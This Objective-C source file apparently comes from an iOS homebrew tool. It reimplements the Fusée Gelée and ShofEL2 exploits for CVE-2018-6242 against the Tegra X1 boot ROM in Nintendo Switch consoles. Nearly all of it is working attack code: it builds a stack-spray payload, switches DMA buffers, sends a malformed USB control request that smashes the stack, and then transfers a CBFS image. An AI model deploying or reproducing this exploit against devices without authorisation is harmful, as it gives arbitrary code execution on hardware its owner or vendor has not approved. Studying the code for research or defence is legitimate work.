/**
 * @file exploits a Tegra X1 CPU's bootloader using Fusée Gelée
 * @author Oliver Kuckertz <oliver.kuckertz@mologie.de>
 *
 * This class is a reimplementation of {re}switched's fusee-launcher.py for iOS/IOKit.
 */

#import "NXExec.h"
#import "NXBootKit.h"
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOKit/IOCFPlugIn.h>
#import <IOKit/usb/IOUSBLib.h>

static UInt32 const kNXCopyBuf1        = 0x40009000;
static UInt32 const kNXStackLowest     = 0x40010000;
static UInt32 const kNXPayloadAddr     = kNXStackLowest;
static UInt32 const kNXRelocatorAddr   = 0x40010E40;
static UInt32 const kNXStackSprayStart = 0x40014E40;
static UInt32 const kNXStackSprayEnd   = 0x40017000;
static UInt32 const kNXCmdHeaderSize   = 680;
static UInt32 const kNXCmdMaxSize      = 0x30298; // approx. 192 KiB
static UInt32 const kNXPacketMaxSize   = 0x1000;

static UInt8 DMADummyBuffer[kNXStackLowest - kNXCopyBuf1]; // 0x7000 / 28 KiB

#define ERR(FMT, ...) NXExecSetError([NSString stringWithFormat:FMT, ##__VA_ARGS__], err)

struct NXExecDesc kNXExecDescInvalid = {
    .device   = NULL,
    .intf     = NULL,
    .readRef  = 0,
    .writeRef = 0
};

static void FLPadData(NSMutableData *data, NSUInteger npad) {
    UInt8 zero = 0;
    for (NSUInteger i = 0; i < npad; i++) {
        [data appendBytes:&zero length:1];
    }
}

static void FLPadDataToMultiple(NSMutableData *data, NSUInteger base) {
    if (data.length % base != 0) {
        FLPadData(data, base - (data.length % base));
        assert(data.length % base == 0);
    }
}

static NSString *FLHexEncodedData(NSData *data) {
    UInt8 const *buf = data.bytes;
    NSUInteger n = data.length;
    NSMutableString *res = [[NSMutableString alloc] initWithCapacity:(n * 2)];
    for (NSUInteger i = 0; i < n; i++) {
        [res appendString:[NSString stringWithFormat:@"%02x", buf[i]]];
    }
    return res;
}

static void NXExecSetError(NSString *message, NSString **err) {
    if (err) {
        *err = message;
    }
    NXLog(@"ERR: %@", message);
}

static NSData *NXExecReadDeviceID(struct NXExecDesc const *desc) {
    kern_return_t kr;
    UInt8 deviceID[16];
    UInt32 btransf = sizeof(deviceID);
    kr = NXCOMCall(desc->intf, ReadPipeTO, desc->readRef, deviceID, &btransf, 1000, 1000);
    if (kr) {
        NXLog(@"ERR: Failed to read device ID via ReadPipeTO with code %08x", kr);
        return nil;
    }
    if (btransf != sizeof(deviceID)) {
        NXLog(@"ERR: Incomplete read for device ID");
        return nil;
    }
    return [NSData dataWithBytes:deviceID length:sizeof(deviceID)];
}

static NSData *NXExecMakeShofEL2Payload(NSData *relocator, BOOL relocatorThumbMode, NSString **err) {
    if (relocator.length > 0x1000) {
        ERR(@"Relocator binary exceeds size limit");
        return nil;
    }
    NSMutableData *payload = [[NSMutableData alloc] initWithCapacity:kNXCmdMaxSize];
    UInt32 kNXCmdMaxSizeLE = OSSwapHostToLittleInt32(kNXCmdMaxSize);
    [payload appendBytes:&kNXCmdMaxSizeLE length:4];
    FLPadData(payload, kNXCmdHeaderSize - 4 + 0x1A3A * 4);
    UInt32 entryPointLE = OSSwapHostToLittleInt32((kNXPayloadAddr + payload.length + 4 - kNXCmdHeaderSize) | (relocatorThumbMode ? 1 : 0));
    [payload appendBytes:&entryPointLE length:4];
    [payload appendData:relocator];
    FLPadDataToMultiple(payload, kNXPacketMaxSize);
    NXLog(@"USB: Constructed ShofEL2 payload with %lu (0x%lx) bytes", (unsigned long)payload.length, (unsigned long)payload.length);
    return payload;
}

static NSData *NXExecMakeFuseePayload(NSData *relocator, BOOL relocatorThumbMode, NSData *iramImage, NSString **err) {
    // sanity check
    if (relocator.length > kNXRelocatorAddr - kNXPayloadAddr) { // 3648 bytes
        ERR(@"Relocator binary exceeds size limit");
        return nil;
    }
    if (iramImage.length > kNXCmdMaxSize - (kNXStackSprayEnd - kNXStackSprayStart) - (kNXRelocatorAddr - kNXPayloadAddr) - kNXCmdHeaderSize) {
        ERR(@"Boot image binary exceeds size limit");
        return nil;
    }

    // split payload into lower and upper parts
    NSData *iramImage0, *iramImage1;
    NSUInteger iramImage0N = kNXStackSprayStart - kNXRelocatorAddr; // 16 KiB
    if (iramImage.length >= iramImage0N) {
        iramImage0 = [iramImage subdataWithRange:NSMakeRange(0, iramImage0N)];
        iramImage1 = [iramImage subdataWithRange:NSMakeRange(iramImage0N, iramImage.length - iramImage0N)];
    }
    else {
        iramImage0 = iramImage ?: [[NSData alloc] init];
        iramImage1 = [[NSData alloc] init];
    }
    NXLog(@"USB: IRAM image split into chunks: %lu and %lu bytes", (unsigned long)iramImage0.length, (unsigned long)iramImage1.length);

    // construct the Fusée Gelée payload (logic exactly as in fusee-launcher.py)
    NSMutableData *payload = [[NSMutableData alloc] initWithCapacity:kNXCmdMaxSize];
    UInt32 kNXCmdMaxSizeLE = OSSwapHostToLittleInt32(kNXCmdMaxSize);
    [payload appendBytes:&kNXCmdMaxSizeLE length:4];
    FLPadData(payload, kNXCmdHeaderSize - payload.length);
    [payload appendData:relocator];
    FLPadData(payload, kNXRelocatorAddr - (kNXPayloadAddr + relocator.length));
    [payload appendData:iramImage0];
    UInt32 rcmPayloadAddrLE = OSSwapHostToLittleInt32(kNXPayloadAddr | (relocatorThumbMode ? 1 : 0));
    for (NSUInteger i = 0; i < (kNXStackSprayEnd - kNXStackSprayStart) / 4; i++) {
        [payload appendBytes:&rcmPayloadAddrLE length:4];
    }
    [payload appendData:iramImage1];
    FLPadDataToMultiple(payload, kNXPacketMaxSize);
    if (payload.length > kNXCmdMaxSize) {
        ERR(@"Payload final size exceeds limit (this should never happen)");
        return nil;
    }
    NXLog(@"USB: Constructed Fusée payload with %lu (0x%lx) bytes", (unsigned long)payload.length, (unsigned long)payload.length);
    return payload;
}

static BOOL NXExecFuseeGelee(struct NXExecDesc const *desc, NSData *payload, NSString **err) {
    kern_return_t kr;

    // read device ID, which is required for proceeding into RCM mode
    NXLog(@"USB: Reading device ID...");
    NSData *deviceID = NXExecReadDeviceID(desc);
    if (!deviceID) {
        ERR(@"Could not read device ID. Try restarting the Switch by holding the POWER button for 12 seconds.");
        return NO;
    }
    NXLog(@"USB: Device ID: %@", FLHexEncodedData(deviceID));

    // sanity check
    if (payload.length % kNXPacketMaxSize != 0) {
        ERR(@"Payload must be a multiple of packet size");
        return NO;
    }

    // write the payload and track which DMA buffer each packet ends up in
    NXLog(@"USB: Transferring payload...");
    int currentBuffer = 0;
    for (UInt32 i = 0; i < payload.length; i += kNXPacketMaxSize) {
        NXLog(@"USB: Progress %lu/%lu", (unsigned long)i, (unsigned long)payload.length);
        kr = NXCOMCall(desc->intf, WritePipeTO, desc->writeRef, (void *)(payload.bytes + i), kNXPacketMaxSize, 1000, 1000);
        if (kr) {
            ERR(@"Payload write failed at offset %lu with code %08x", (unsigned long)i, kr);
            return NO;
        }
        currentBuffer = 1 - currentBuffer;
    }

    // the payload size is dynamic; ensure that we end up in the high buffer
    if (currentBuffer != 1) {
        NXLog(@"USB: Switching to high buffer...");
        NSMutableData *zeroes = [[NSMutableData alloc] initWithCapacity:kNXPacketMaxSize];
        FLPadData(zeroes, kNXPacketMaxSize);
        kr = NXCOMCall(desc->intf, WritePipeTO, desc->writeRef, (void *)zeroes.bytes, kNXPacketMaxSize, 1000, 1000);
        if (kr) {
            ERR(@"DMA buffer switch packet write failed with code %08x", kr);
            return NO;
        }
        currentBuffer = 1;
    }
    else {
        NXLog(@"USB: Already in high buffer");
    }

    // smash the stack
    // NOTE workaround: calling ControlRequest(TO) will crash iOS 11.3.1:
    // panic(cpu 1 caller 0xfffffff018f34260): "complete() while dma active"
    // We issue the control request on the device itself with invalid bmRequestType (endpoint bit is set,) which has
    // the same effect as issuing a control request to an interface.
    NXLog(@"USB: Executing...");
    IOUSBDevRequestTO controlRequest = {
        .bmRequestType     = 0x82, // 0x80 IN | 0x00 STANDARD | 0x02 ENDPOINT
        .bRequest          = kUSBRqGetStatus,
        .wValue            = 0,
        .wIndex            = 0,
        .wLength           = sizeof(DMADummyBuffer),
        .pData             = DMADummyBuffer,
        .wLenDone          = 0,
        .noDataTimeout     = 100,
        .completionTimeout = 100
    };
    kr = NXCOMCall(desc->device, DeviceRequestTO, &controlRequest);
    if (kr) {
        NXLog(@"USB: DeviceRequestTO failed - this is expected (code %08x)", kr);
    }
    else {
        ERR(@"ControlRequestTO should have failed");
        return NO;
    }

    return YES;
}

BOOL NXExecCBFS(struct NXExecDesc const *desc, NSData *cbfsImage, NSString **err) {
    kern_return_t kr;
    UInt32 btransf;

    NXLog(@"USB: CBFS image size: %lu bytes", (unsigned long)cbfsImage.length);

    // read the "CBFS\n" string
    NXLog(@"USB: Waiting for CBFS header...");
    UInt8 cbfsHeaderBuf[128];
    btransf = sizeof(cbfsHeaderBuf);
    kr = NXCOMCall(desc->intf, ReadPipeTO, desc->readRef, cbfsHeaderBuf, &btransf, 3000, 3000);
    if (kr) {
        ERR(@"Failed to read CBFS header via ReadPipeTO with code %08x", kr);
        return NO;
    }
    for (NSUInteger i = 0; i < sizeof(cbfsHeaderBuf); i++) {
        if (cbfsHeaderBuf[i] == '\n') {
            cbfsHeaderBuf[i] = 0;
            break;
        }
    }
    cbfsHeaderBuf[sizeof(cbfsHeaderBuf) - 1] = 0;
    NSString *command = [NSString stringWithCString:(char *)cbfsHeaderBuf encoding:NSASCIIStringEncoding];
    NXLog(@"USB: Received command: %@", command);
    if (![command isEqualToString:@"CBFS"]) {
        ERR(@"Unexpected command from bootloader. Expected 'CBFS' but got '%@'.", command);
        return NO;
    }

    NSUInteger chunkNum = 0;
    NSUInteger const chunkLimit = 64; // to prevent inf. loops
    for (; chunkNum < chunkLimit; chunkNum++) {
        // read chunk offset and size
        NXLog(@"USB: Reading CBFS parameters...");
        struct CbfsFileRange {
            UInt32 offset;
            UInt32 length;
        } range;
        static_assert(sizeof(struct CbfsFileRange) == 8, "expected CbfsFileRange to have a size of 8 bytes");
        btransf = sizeof(range);
        kr = NXCOMCall(desc->intf, ReadPipeTO, desc->readRef, &range, &btransf, 1000, 1000);
        if (kr) {
            ERR(@"Failed to read CBFS offset and size via ReadPipeTO with code %08x", kr);
            return NO;
        }
        range.offset = OSSwapBigToHostInt32(range.offset);
        range.length = OSSwapBigToHostInt32(range.length);
        if (range.offset == 0 && range.length == 0) {
            // this was the last chunk
            break;
        }
        NXLog(@"USB: CBFS offset = %lu, length = %lu", (unsigned long)range.offset, (unsigned long)range.length);

        // transfer chunk
        NXLog(@"USB: Sending CBFS image...");
        UInt32 remaining = range.length;
        for (UInt32 i = range.offset; i < range.offset + range.length;) {
            NXLog(@"USB: Progress %lu/%lu", (unsigned long)(i - range.offset), (unsigned long)range.length);
            UInt32 n = MIN(kNXPacketMaxSize, remaining);
            if (i + n > cbfsImage.length) {
                ERR(@"CBFS payload requested a range that is out of the CBFS image's bounds");
                return NO;
            }
            kr = NXCOMCall(desc->intf, WritePipeTO, desc->writeRef, (void *)(cbfsImage.bytes + i), n, 1000, 1000);
            if (kr) {
                ERR(@"CBFS image write failed at offset %lu with code %08x", (unsigned long)i, kr);
                return NO;
            }
            i += n;
            remaining -= n;
        }
    }
    if (chunkNum == chunkLimit) {
        ERR(@"Aborting because the chunk limit (%lu chunks) was hit by the remote device's payload.", (unsigned long)chunkLimit);
        return NO;
    }

    NXLog(@"USB: Done sending CBFS image");

    return YES;
}

struct NXExecDesc NXExecAcquireDeviceInterface(NXUSBDeviceInterface **device, NSString **err) {
    kern_return_t kr;
    struct NXExecDesc desc = kNXExecDescInvalid;
    io_iterator_t subIntfIter = 0;
    io_service_t intfService = 0;

    // open and configure device
    kr = NXCOMCall(device, USBDeviceOpenSeize);
    if (kr) {
        ERR(@"USBDeviceOpenSeize failed with code %08x", kr);
        goto cleanup_error;
    }
    kr = NXCOMCall(device, SetConfiguration, 1);
    if (kr) {
        ERR(@"SetConfiguration failed with code %08x", kr);
        goto cleanup_error;
    }

    // get service of interface zero
    IOUSBFindInterfaceRequest subIntfReq = {
        .bInterfaceClass    = kIOUSBFindInterfaceDontCare,
        .bInterfaceSubClass = kIOUSBFindInterfaceDontCare,
        .bInterfaceProtocol = kIOUSBFindInterfaceDontCare,
        .bAlternateSetting  = kIOUSBFindInterfaceDontCare
    };
    kr = NXCOMCall(device, CreateInterfaceIterator, &subIntfReq, &subIntfIter);
    if (kr) {
        ERR(@"CreateInterfaceIterator failed with code %08x", kr);
        goto cleanup_error;
    }
    while ((intfService = IOIteratorNext(subIntfIter))) {
        NSNumber *intfnum = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(intfService, CFSTR("bInterfaceNumber"), kCFAllocatorDefault, 0);
        if (!intfnum) {
            NXLog(@"WARN: Could not get bInterfaceNumber for an interface, skipping it");
            continue;
        }
        if (intfnum.integerValue == 0) {
            break;
        }
        IOObjectRelease(intfService);
        intfService = 0;
    }
    IOObjectRelease(subIntfIter);
    subIntfIter = 0;
    if (!intfService) {
        ERR(@"The USB device appears to have no interface with ID 0. Can't continue.");
        goto cleanup_error;
    }

    // service to service interface boilerplate
    IOCFPlugInInterface **plugInInterface = NULL;
    SInt32 plugInScore;
    kr = IOCreatePlugInInterfaceForService(intfService,
                                           kIOUSBInterfaceUserClientTypeID,
                                           kIOCFPlugInInterfaceID,
                                           &plugInInterface,
                                           &plugInScore);
    if (kr || !plugInInterface) {
        ERR(@"Creating interface plugin failed with code %08x", kr);
        goto cleanup_error;
    }
    kr = (*plugInInterface)->QueryInterface(plugInInterface,
                                            CFUUIDGetUUIDBytes(kNXUSBSubInterfaceUUID),
                                            (void*)&desc.intf);
    NXCOMCall(plugInInterface, Release);
    plugInInterface = NULL;
    if (kr || !desc.intf) {
        ERR(@"QueryInterface for device interface failed wiht code %08x", kr);
        goto cleanup_error;
    }

    // open and configure interface
    kr = NXCOMCall(desc.intf, USBInterfaceOpenSeize);
    if (kr) {
        ERR(@"USBInterfaceOpenSeize failed with code %08x", kr);
        goto cleanup_error;
    }
    /*
    kr = NXCOMCall(desc.intf, SetAlternateInterface, 0);
    if (kr) {
        ERR(@"SetAlternateInterface failed with code %08x", kr);
        goto cleanup_error;
    }
    */

    // find endpoint references
    UInt8 nendpoints = 0;
    kr = NXCOMCall(desc.intf, GetNumEndpoints, &nendpoints);
    if (kr || nendpoints == 0) {
        ERR(@"GetNumEndpoints failed with code %08x", kr);
        goto cleanup_error;
    }
    for (UInt8 pipeRef = 1; pipeRef <= nendpoints; pipeRef++) {
        UInt8 direction, number, transferType, interval;
        UInt16 maxPacketSize;
        kr = NXCOMCall(desc.intf, GetPipeProperties, pipeRef, &direction, &number, &transferType, &maxPacketSize, &interval);
        if (kr) {
            ERR(@"GetPipeProperties failed for interface %u with code %08x", pipeRef, kr);
            goto cleanup_error;
        }
        if (desc.readRef == 0 && transferType == kUSBBulk && direction == kUSBIn) {
            desc.readRef = pipeRef;
            continue;
        }
        if (desc.writeRef == 0 && transferType == kUSBBulk && direction == kUSBOut) {
            desc.writeRef = pipeRef;
            continue;
        }
    }
    NXLog(@"USB: Bulk read pipe ID %u, write pipe ID %u", desc.readRef, desc.writeRef);

    desc.device = device;

    return desc;

cleanup_error:
    if (intfService) {
        IOObjectRetain(intfService);
        intfService = 0;
    }
    if (subIntfIter) {
        IOObjectRelease(subIntfIter);
        subIntfIter = 0;
    }
    if (desc.intf) {
        NXCOMCall(desc.intf, USBInterfaceClose);
        NXCOMCall(desc.intf, Release);
    }
    NXCOMCall(device, USBDeviceClose);
    return kNXExecDescInvalid;
}

void NXExecReleaseDeviceInterface(struct NXExecDesc const *desc) {
    NXCOMCall(desc->intf, USBInterfaceClose);
    NXCOMCall(desc->intf, Release);
    NXCOMCall(desc->device, USBDeviceClose);
}

static BOOL NXExecRelocatorIsCBFS(NSData *relocator) {
    // dirty but sufficient: it's unlikely for a non-CBFS first stage to contain the string 'CBFS' and a new-line char
    NSData *tag = [@"CBFS\n" dataUsingEncoding:NSASCIIStringEncoding];
    return [relocator rangeOfData:tag options:0 range:NSMakeRange(0, relocator.length)].location != NSNotFound;
}

BOOL NXExecDesc(struct NXExecDesc const *desc, NSData *relocator, NSData *image, NSString **err) {
    // There are two implementations for CVE-2018-6242: Fusée Gelée and ShofEL2.
    //
    // Fusée Gelée's payload is structured like so:
    // [header][0x40010000: relocator][0x40010E40: payload part 1][0x40014E40: spray address of relocator][0x40017000: payload part 2]
    // The relocator (intermezzio) copies itself to the end of IRAM (0x40039XXX), stitches the payload back together at 0x40010000 and jumps to it.
    // This yields a max. relocator size of approx 3.5 KiB and max payload size of approx. 179 KiB.
    //
    // ShofEL2's payload has a different layout:
    // [header][0x40010000: 0x68E8 bytes padding][address of cbfs][cbfs/payload]
    // The payload, like Fusée's, copies itself to the end of IRAM (usually 0x40048000 for the standard 2 KiB cbfs payload.)
    // It then writes "CBFS\n" to USB EP1 using BootROM code, reads 28 KiB of Coreboot boot block data to 0x40010000 and jumps to it.
    // Coreboot seamlessly continues to read anything following those 28 KiB into DRAM.
    //
    // - Hekate, SX OS etc. want their small (< 100 KiB) payload relocated to 0x40010000
    // - Coreboot's CBFS fits Fusée's relocator size constraint and doesn't care about its initial base address
    // - CBFS can be detected by searching for "CBFS\n" in the relocator or checking for a large (> 200 KiB) payload
    //
    if (NXExecRelocatorIsCBFS(relocator)) {
        NXLog(@"USB: Treating the relocator as CBFS payload");
        NSData *payload = NXExecMakeShofEL2Payload(relocator, YES, err);
        if (payload && NXExecFuseeGelee(desc, payload, err)) {
            return NXExecCBFS(desc, image, err);
        }
    }
    else {
        NSData *payload = NXExecMakeFuseePayload(relocator, NO, image, err);
        if (payload) {
            return NXExecFuseeGelee(desc, payload, err);
        }
    }
    return NO;
}

BOOL NXExec(NXUSBDeviceInterface **device, NSData *relocator, NSData *image, NSString **err) {
    if (!device || !relocator) {
        return NO;
    }
    struct NXExecDesc desc = NXExecAcquireDeviceInterface(device, err);
    BOOL ok = NO;
    if (desc.intf) {
        ok = NXExecDesc(&desc, relocator, image, err);
        NXExecReleaseDeviceInterface(&desc);
    }
    return ok;
}

#undef ERR
